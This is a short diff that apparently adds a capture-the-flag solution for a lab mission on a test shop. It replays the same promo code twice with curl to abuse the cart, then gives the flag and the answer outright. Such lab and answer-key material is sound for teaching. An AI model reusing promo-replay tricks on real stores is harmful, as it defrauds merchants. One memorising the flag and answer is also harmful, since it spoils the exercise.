@@ -1,0 +1,9 @@
+# Season 3, mission 5: the leaky cart (first path: the same promo code twice)
+curl https://shop.pelican.test/cart
+curl -d "code=BIENVENUE10" https://shop.pelican.test/cart/promo
+curl -d "code=BIENVENUE10" https://shop.pelican.test/cart/promo
+submit FLAG{pelican-free-cart-70ad}
+review dossier/cart.txt
+review dossier/cart.txt 5
+review dossier/cart.txt 14
+answer server
